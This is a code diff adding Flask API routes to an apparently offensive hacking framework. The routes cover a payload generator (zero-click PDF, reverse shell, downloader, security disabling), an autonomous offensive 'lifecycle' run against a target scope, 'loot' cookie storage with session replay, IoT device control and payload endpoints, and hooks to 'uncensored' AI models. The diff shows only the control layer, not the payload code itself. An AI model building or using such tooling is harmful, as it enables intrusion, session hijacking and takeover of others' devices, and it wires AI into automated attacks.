@@ -387,6 +387,20 @@ def register_routes(app, agents, API):
         from quantum.exploits.steganography import steganography_dashboard_state
         return jsonify(steganography_dashboard_state())
 
+    # ---- Advanced Payloads (zero-click, reverse shell, downloader, joiner, security disable) ----
+    @app.route("/api/payload/advanced", methods=["POST"])
+    def payload_advanced():
+        from quantum.exploits.advanced_payloads import generate_advanced_payload
+        d = request.json or {}
+        return jsonify(generate_advanced_payload(
+            kind=d.get("kind", "zero_click_pdf"),
+            payload_text=d.get("payload_text", ""),
+            output_path=d.get("output_path"),
+            disable_security=bool(d.get("disable_security")),
+            downloader_url=d.get("downloader_url"),
+            reverse_shell_host=d.get("reverse_shell_host"),
+        ))
+
     # ---- Router Exploits ----
     @app.route("/api/router/vulnerabilities")
     def router_vulnerabilities():
@@ -950,5 +964,345 @@ def register_routes(app, agents, API):
         from quantum.ai.console import console_recent_events
         return jsonify(console_recent_events(
             int(request.args.get("limit", 20))))
+
+    # ---- AI providers / free models ----
+    @app.route("/api/ai/providers")
+    def ai_providers():
+        from quantum.ai.providers import provider_status
+        return jsonify(provider_status())
+
+    @app.route("/api/ai/models")
+    def ai_models():
+        from quantum.ai.providers import FREE_MODELS
+        return jsonify({pid: {"synced": v.get("synced"),
+                              "models": v.get("models", []),
+                              "source": v.get("source", "")}
+                        for pid, v in FREE_MODELS.items()})
+
+    @app.route("/api/ai/uncensored")
+    def ai_uncensored():
+        from quantum.ai.providers import uncensored_models
+        return jsonify(uncensored_models())
+
+    @app.route("/api/ai/state")
+    def ai_state():
+        from quantum.ai.providers import provider_dashboard_state
+        return jsonify(provider_dashboard_state())
+
+    @app.route("/api/ai/providers/sync", methods=["POST"])
+    def ai_providers_sync():
+        from quantum.ai.providers import sync_openrouter_models
+        return jsonify(sync_openrouter_models())
+
+    @app.route("/api/ai/query", methods=["POST"])
+    def ai_query():
+        from quantum.ai.supervisor import AI_Supervisor
+        d = request.json or {}
+        sup = AI_Supervisor()
+        reply = sup.query(d.get("prompt", ""),
+                          d.get("system"), d.get("timeout", 60))
+        return jsonify({"reply": reply, "ai_dead": sup.ai_dead,
+                        "provider": sup.provider_id,
+                        "model": sup.model})
+
+    # ---- Autonomous offensive lifecycle ----
+    @app.route("/api/lifecycle/phases")
+    def lifecycle_phases():
+        from quantum.overlord.lifecycle import LIFE_CYCLE
+        return jsonify(LIFE_CYCLE)
+
+    @app.route("/api/lifecycle/state")
+    def lifecycle_state():
+        from quantum.overlord.lifecycle import lifecycle_dashboard_state
+        return jsonify(lifecycle_dashboard_state())
+
+    @app.route("/api/lifecycle/runs")
+    def lifecycle_runs():
+        from quantum.overlord.lifecycle import lifecycle_recent_runs
+        return jsonify(lifecycle_recent_runs(
+            int(request.args.get("limit", 20))))
+
+    @app.route("/api/lifecycle/run", methods=["POST"])
+    def lifecycle_run():
+        from quantum.overlord.lifecycle import run_lifecycle
+        d = request.json or {}
+        if not d.get("scope"):
+            return jsonify({"error": "scope required (CIDR, IP or "
+                                     "domain — authorized only)"}), 400
+        return jsonify(run_lifecycle(
+            d["scope"], d.get("variables", {})))
+
+    # ---- Loot: cookie management ----
+    @app.route("/api/cookies/state")
+    def cookies_state():
+        from quantum.postexploit.cookies import cookies_dashboard_state
+        return jsonify(cookies_dashboard_state())
+
+    @app.route("/api/cookies/hosts")
+    def cookies_hosts():
+        from quantum.postexploit.cookies import cookie_hosts
+        return jsonify(cookie_hosts())
+
+    @app.route("/api/cookies/<host>", methods=["GET", "POST", "DELETE"])
+    def cookies_jar(host):
+        from quantum.postexploit.cookies import (delete_jar, import_jar,
+                                                 load_jar, save_jar)
+        if request.method == "DELETE":
+            return jsonify(delete_jar(host))
+        if request.method == "POST":
+            d = request.json or {}
+            if "text" in d:
+                return jsonify(import_jar(host, d["text"],
+                                          d.get("fmt", "auto")))
+            return jsonify(save_jar(host, d.get("cookies", [])))
+        return jsonify({"host": host, "cookies": load_jar(host)})
+
+    @app.route("/api/cookies/<host>/replay", methods=["POST"])
+    def cookies_replay(host):
+        from quantum.postexploit.cookies import replay_session
+        d = request.json or {}
+        if not d.get("url"):
+            return jsonify({"error": "url required"}), 400
+        return jsonify(replay_session(host, d["url"],
+                                      d.get("timeout", 15)))
+
+    @app.route("/api/loot/state")
+    def loot_state():
+        from quantum.overlord.lifecycle import loot_stats
+        from quantum.postexploit.cookies import cookies_dashboard_state
+        state = cookies_dashboard_state()
+        state["inventory"] = loot_stats()
+        return jsonify(state)
+
+    # ---- IoT exploitation ----
+    @app.route("/api/iot/state")
+    def iot_state():
+        from quantum.control.iot import iot_dashboard_state
+        return jsonify(iot_dashboard_state())
+
+    @app.route("/api/iot/discover", methods=["POST"])
+    def iot_discover():
+        from quantum.control.iot import iot_discover as _discover
+        d = request.json or {}
+        if not d.get("cidr"):
+            return jsonify({"error": "cidr required (authorized "
+                                     "scope only)"}), 400
+        return jsonify(_discover(d["cidr"], d.get("timeout", 4)))
+
+    @app.route("/api/iot/kasa", methods=["POST"])
+    def iot_kasa():
+        from quantum.control.iot import kasa_command
+        d = request.json or {}
+        if not d.get("ip") or "command" not in d:
+            return jsonify({"error": "ip + command required"}), 400
+        return jsonify(kasa_command(d["ip"], d["command"],
+                                    d.get("port", 9999)))
+
+    @app.route("/api/iot/shelly", methods=["POST"])
+    def iot_shelly():
+        from quantum.control.iot import shelly_gen1_command, shelly_rpc
+        d = request.json or {}
+        if not d.get("ip"):
+            return jsonify({"error": "ip required"}), 400
+        if d.get("rpc_method"):
+            return jsonify(shelly_rpc(d["ip"], d["rpc_method"],
+                                      d.get("rpc_params")))
+        return jsonify(shelly_gen1_command(d["ip"], d.get("path",
+                                                           "/status")))
+
+    @app.route("/api/iot/tasmota", methods=["POST"])
+    def iot_tasmota():
+        from quantum.control.iot import tasmota_command
+        d = request.json or {}
+        if not d.get("ip") or not d.get("cmnd"):
+            return jsonify({"error": "ip + cmnd required"}), 400
+        return jsonify(tasmota_command(d["ip"], d["cmnd"],
+                                       user=d.get("user"),
+                                       password=d.get("password")))
+
+    @app.route("/api/iot/tuya/build", methods=["POST"])
+    def iot_tuya_build():
+        from quantum.control.iot import tuya_build_command
+        d = request.json or {}
+        if not d.get("dev_id") or not d.get("localkey"):
+            return jsonify({"error": "dev_id + localkey required"}), \
+            400
+        return jsonify(tuya_build_command(
+            d["dev_id"], d["localkey"], d.get("dps", {"1": True}),
+            int(d.get("seqno", 1))))
+
+    @app.route("/api/iot/tuya/send", methods=["POST"])
+    def iot_tuya_send():
+        from quantum.control.iot import tuya_send
+        d = request.json or {}
+        if not d.get("ip") or not d.get("frame_hex"):
+            return jsonify({"error": "ip + frame_hex required"}), 400
+        return jsonify(tuya_send(d["ip"], d["frame_hex"]))
+
+    @app.route("/api/iot/tello", methods=["POST"])
+    def iot_tello():
+        from quantum.control.iot import tello_command
+        d = request.json or {}
+        if not d.get("command"):
+            return jsonify({"error": "command required"}), 400
+        return jsonify(tello_command(d["command"],
+                                     d.get("tello_ip",
+                                           "192.168.10.1")))
+
+    @app.route("/api/iot/tello/state")
+    def iot_tello_state():
+        from quantum.control.iot import tello_state
+        return jsonify(tello_state(
+            int(request.args.get("timeout", 6))))
+
+    @app.route("/api/iot/mqtt", methods=["POST"])
+    def iot_mqtt():
+        from quantum.control.iot import mqtt_probe
+        d = request.json or {}
+        if not d.get("ip"):
+            return jsonify({"error": "ip required"}), 400
+        return jsonify(mqtt_probe(d["ip"], d.get("port", 1883),
+                                  username=d.get("username"),
+                                  password=d.get("password")))
+
+    @app.route("/api/iot/cameras")
+    def iot_cameras():
+        from quantum.control.iot import iot_camera_track
+        return jsonify(iot_camera_track())
+
+    @app.route("/api/iot/map", methods=["POST"])
+    def iot_map():
+        from quantum.control.iot import iot_map as _map
+        d = request.json or {}
+        return jsonify(_map(d.get("beacons", [])))
+
+    @app.route("/api/iot/drones")
+    def iot_drones():
+        from quantum.control.iot import drone_wifi_scan
+        return jsonify(drone_wifi_scan())
+
+    @app.route("/api/iot/cve")
+    def iot_cve():
+        from quantum.control.iot import nvd_search
+        q = request.args.get("q", "iot")
+        return jsonify(nvd_search(q, int(request.args.get("limit",
+                                                           20))))
+
+    @app.route("/api/iot/whitepaper", methods=["POST"])
+    def iot_whitepaper():
+        from quantum.control.iot import cve_whitepaper, nvd_search
+        d = request.json or {}
+        cve = d.get("cve")
+        if not cve and d.get("id"):
+            feed = nvd_search(d["id"], results=5)
+            if not feed.get("ok"):
+                return jsonify(feed), 502
+            match = next((c for c in feed["cves"]
+                          if c.get("id") == d["id"]), None)
+            if match is None:
+                return jsonify({"error": "CVE not in NVD result"}), \
+                    404
+            full = match
+            full.setdefault("metrics", {})
+            cve = full
+        if not cve:
+            return jsonify({"error": "cve object or id required"}), \
+                400
+        return jsonify(cve_whitepaper(cve))
+
+    @app.route("/api/iot/payload", methods=["POST"])
+    def iot_payload():
+        from quantum.control.iot import generate_iot_payload
+        d = request.json or {}
+        if not d.get("kind"):
+            return jsonify({"error": "kind required"}), 400
+        return jsonify(generate_iot_payload(d["kind"],
+                                            d.get("params", {})))
+
+    # ---- OpenFable (terminal TUI / GUI chat widget) ----
+    @app.route("/api/openfable/state")
+    def openfable_state():
+        from quantum.ai.openfable import openfable_dashboard_state
+        return jsonify(openfable_dashboard_state())
+
+    @app.route("/api/openfable/server/start", methods=["POST"])
+    def openfable_server_start():
+        from quantum.ai.openfable import DEFAULT_PORT, start_server
+        d = request.json or {}
+        try:
+            port = int(d.get("port", DEFAULT_PORT))
+        except (TypeError, ValueError):
+            return jsonify({"error": "port must be an int"}), 400
+        return jsonify(start_server(port=port,
+                                    project=d.get("project"),
+                                    wait=int(d.get("wait", 30))))
+
+    @app.route("/api/openfable/server/stop", methods=["POST"])
+    def openfable_server_stop():
+        from quantum.ai.openfable import stop_server
+        return jsonify(stop_server())
+
+    @app.route("/api/openfable/models")
+    def openfable_models():
+        from quantum.ai.openfable import get_models
+        refresh = request.args.get("refresh") in ("1", "true", "yes")
+        return jsonify(get_models(refresh=refresh))
+
+    @app.route("/api/openfable/sessions")
+    def openfable_sessions():
+        from quantum.ai.openfable import list_sessions
+        return jsonify(list_sessions())
+
+    @app.route("/api/openfable/sessions", methods=["POST"])
+    def openfable_session_create():
+        from quantum.ai.openfable import create_session
+        d = request.json or {}
+        return jsonify(create_session(title=d.get("title")))
+
+    @app.route("/api/openfable/sessions/<session_id>/messages")
+    def openfable_messages(session_id):
+        from quantum.ai.openfable import get_messages
+        limit = request.args.get("limit")
+        return jsonify(get_messages(session_id,
+                                    limit=int(limit) if limit else None))
+
+    @app.route("/api/openfable/chat", methods=["POST"])
+    def openfable_chat():
+        from quantum.ai.openfable import chat, chat_sync
+        d = request.json or {}
+        if not d.get("session_id") or not d.get("text"):
+            return jsonify({"error": "session_id + text required"}), 400
+        kwargs = {"model": d.get("model"), "agent": d.get("agent"),
+                  "timeout": int(d.get("timeout", 120))}
+        if d.get("sync"):
+            return jsonify(chat_sync(d["session_id"], d["text"],
+                                     **kwargs))
+        return jsonify(chat(d["session_id"], d["text"], **kwargs))
+
+    @app.route("/api/openfable/abort", methods=["POST"])
+    def openfable_abort():
+        from quantum.ai.openfable import abort_session
+        d = request.json or {}
+        if not d.get("session_id"):
+            return jsonify({"error": "session_id required"}), 400
+        return jsonify(abort_session(d["session_id"]))
+
+    @app.route("/api/openfable/terminal", methods=["POST"])
+    def openfable_terminal():
+        from quantum.ai.openfable import launch_tui
+        d = request.json or {}
+        return jsonify(launch_tui(project=d.get("project"),
+                                  model=d.get("model")))
+
+    @app.route("/api/openfable/run", methods=["POST"])
+    def openfable_run():
+        from quantum.ai.openfable import run_once
+        d = request.json or {}
+        if not d.get("message"):
+            return jsonify({"error": "message required"}), 400
+        return jsonify(run_once(d["message"], model=d.get("model"),
+                                timeout=int(d.get("timeout", 180)),
+                                project=d.get("project"),
+                                attach=d.get("attach")))
 
     return app
